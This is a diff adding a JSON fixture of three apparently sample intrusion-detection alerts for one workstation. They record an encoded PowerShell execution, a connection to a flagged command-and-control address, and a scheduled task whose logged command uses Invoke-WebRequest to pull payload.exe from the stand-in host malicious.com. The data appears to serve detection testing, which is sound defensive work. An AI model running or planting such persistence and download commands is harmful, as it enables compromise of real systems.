@@ -1,0 +1,62 @@
+[
+  {
+    "version": 1,
+    "timestamp": "2026-07-18T10:15:00Z",
+    "rule": {
+      "level": 10,
+      "description": "PowerShell encoded command execution",
+      "groups": ["windows", "powershell", "attack"],
+      "id": "100100"
+    },
+    "agent": {
+      "id": "001",
+      "name": "WORKSTATION-07",
+      "ip": "192.168.1.100"
+    },
+    "id": "15750000-0000-0000-0000-000000000001",
+    "full_log": "powershell.exe -enc JABzAD0ATgBpAGUAdABzAC4AVABlAHMAdAA7ACAAJABzACAAPQAgACIAVABlAHMAdAAiADsAIAAkAHMA",
+    "location": "WORKSTATION-07"
+  },
+  {
+    "version": 1,
+    "timestamp": "2026-07-18T10:16:32Z",
+    "rule": {
+      "level": 12,
+      "description": "Suspicious outbound connection to known C2 IP",
+      "groups": ["network", "c2", "attack"],
+      "id": "100200"
+    },
+    "agent": {
+      "id": "001",
+      "name": "WORKSTATION-07",
+      "ip": "192.168.1.100"
+    },
+    "id": "15750000-0000-0000-0000-000000000002",
+    "full_log": "Outbound connection from 192.168.1.100:54321 to 185.44.12.7:443",
+    "data": {
+      "srcip": "192.168.1.100",
+      "dstip": "185.44.12.7",
+      "dstport": 443,
+      "protocol": "tcp"
+    },
+    "location": "WORKSTATION-07"
+  },
+  {
+    "version": 1,
+    "timestamp": "2026-07-18T10:17:10Z",
+    "rule": {
+      "level": 8,
+      "description": "New scheduled task created",
+      "groups": ["persistence", "windows", "attack"],
+      "id": "100300"
+    },
+    "agent": {
+      "id": "001",
+      "name": "WORKSTATION-07",
+      "ip": "192.168.1.100"
+    },
+    "id": "15750000-0000-0000-0000-000000000003",
+    "full_log": "schtasks.exe /create /tn 'UpdateTask' /tr 'powershell.exe -c Invoke-WebRequest http://malicious.com/payload.exe' /sc daily",
+    "location": "WORKSTATION-07"
+  }
+]
